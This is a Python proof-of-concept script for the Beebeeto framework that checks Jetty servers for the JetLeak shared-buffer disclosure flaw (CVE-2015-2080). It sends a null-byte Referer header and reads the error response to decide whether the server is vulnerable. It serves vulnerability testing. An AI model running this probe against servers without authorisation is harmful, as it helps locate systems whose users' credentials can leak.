#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import ssl
import sys
import urllib
import httplib
import urllib2
import string
import getopt

from urlparse import urlparse

from baseframe import BaseFrame
from utils.http.forgeheaders import ForgeHeaders


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0037',
            'name': 'Jetty Web Server 9.2.x-9.3.x 共享缓存区远程泄露漏洞 [CVE-2015-2080] POC',
            'author': 'user1018',
            'create_date': '2015-02-26',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Jetty Web Server',
            'vul_version': ['9.2.8'],
            'type': 'Other',
            'tag': ['Jetty Web Server漏洞', 'CVE-2015-2080', '共享缓存区远程泄露漏洞'],
            'desc': '''
                    GDS安全公司发现了一个Jetty web server共享缓存区远程泄露漏洞，
                    通过该漏洞一个没有认证过的攻击者可以远程获取之前合法用户向服务器发送的请求。
                    简而言之，攻击者可以从存在漏洞的服务器远程获取缓存区的敏感信息，
                    包括http头的信息（cookies、认证的tokens、防止CSRF的tokens等等）以及用户POST的数据（用户名、密码等）。

                    漏洞的根源在于当header中被插入恶意的字符并提交到服务器后，会从异常处理代码中获得共享缓冲区大约16
                    bytes的数据。因此攻击者可以通过提交一个精心构造的请求来获取异常并偏移到共享缓冲区中，
                    共享缓冲区中存的是用户先前提交的数据，Jetty服务器会根据用户提交的请求返回大约16
                    bytes的数据块，这里面会包含敏感信息。
                    ''',
            'references': [
                    'http://blog.gdssecurity.com/labs/2015/2/25/jetleak-vulnerability-remote-leakage-of-shared-buffers-in-je.html',
                    'https://github.com/GDSSecurity/Jetleak-Testing-Script/blob/master/jetleak_tester.py'
                    'http://bobao.360.cn/news/detail/1251.html',
            ],
        },
    }


    def _init_user_parser(self):
        self.user_parser.add_option('-p','--port',
                                    action='store', dest='port', type='string', default='80',
                                    help='Use port. Default: 80')

    @classmethod
    def verify(cls, args):
        '''
        Github Author: Gotham Digital Science
        Purpose: This tool is intended to provide a quick-and-dirty way for organizations to test whether
                 their Jetty web server versions are vulnerable to JetLeak. Currently, this script does
                 not handle sites with invalid SSL certs. This will be fixed in a future iteration.
        '''

        conn = None
        verify_url = urlparse(args['options']['target'])
        port = args['options']['port']
        fake_headers = ForgeHeaders().get_headers()

        if verify_url.scheme == "https":
            conn = httplib.HTTPSConnection(verify_url.netloc + ":" + port)
        elif verify_url.scheme == "http":
            conn = httplib.HTTPConnection(verify_url.netloc + ":" + port)
        else:
            args['poc_ret']['Error'] = "Error: Only 'http' or 'https' URL Schemes Supported"
            return args

        if args['options']['verbose']:
            print '[*] Connect: %s ...' % verify_url.netloc

        try:
            x = '\x00'
            fake_headers['Referer'] = x
            conn.request('POST', '/', '', fake_headers)
            r1 = conn.getresponse()
        except:
            return args

        if (r1.status == 400 and ("Illegal character 0x0 in state" in r1.reason)):
            args['success'] = True
            args['poc_ret']['vul_url'] = '%s:%s' % (verify_url, port)
            args['poc_ret']['headers'] = fake_headers
            return args
        return args


    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())